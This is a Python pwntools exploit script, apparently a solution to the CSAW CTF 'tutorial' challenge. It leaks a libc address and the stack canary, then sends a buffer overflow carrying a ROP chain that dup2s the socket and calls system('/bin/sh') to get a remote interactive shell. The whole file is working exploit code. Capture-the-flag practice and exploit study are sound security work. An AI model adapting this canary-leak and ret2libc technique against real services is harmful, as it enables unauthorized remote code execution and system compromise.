#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context(arch='amd64', os='linux')

binary = ELF('tutorial')

if args['REMOTE']:
    r = remote('pwn.chal.csaw.io', 8002)
    libc = ELF('./libc-2.19.so')
else:
    r = remote('127.0.0.1', 31337)
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

# find libc base
r.recvuntil('>')
r.sendline('1')
puts_address = int(r.recvline()[10:], 16) + 0x500
libc.address = puts_address - libc.symbols['puts']
print 'libc address: %x' % libc.address

# find canary
r.recvuntil('>')
r.sendline('2')
r.recvuntil('>')
r.sendline()
canary = r.recv(0x144)[0x138:0x138 + 0x8]
print 'canary: %s' % canary.encode('hex')

# build rop chain
rop = ROP([binary, libc])

# dup2(4, 0)
rop.raw(rop.find_gadget(['pop rdi', 'ret']))
rop.raw(0x4)
rop.raw(rop.find_gadget(['pop rsi', 'ret']))
rop.raw(0x0)
rop.raw(libc.symbols['dup2'])

# dup2(4, 1)
rop.raw(rop.find_gadget(['pop rsi', 'ret']))
rop.raw(0x1)
rop.raw(libc.symbols['dup2'])

# system('/bin/sh')
binsh = next(libc.search('/bin/sh'))
rop.system(binsh)

print rop.dump()

# send exploit
r.recvuntil('>')
r.sendline('2')
r.recvuntil('>')
exploit = 'X' * 0x138 + canary + 'X' * 0x8 + bytes(rop)
assert len(exploit) <= 0x1cc
r.sendline(exploit)

r.interactive()
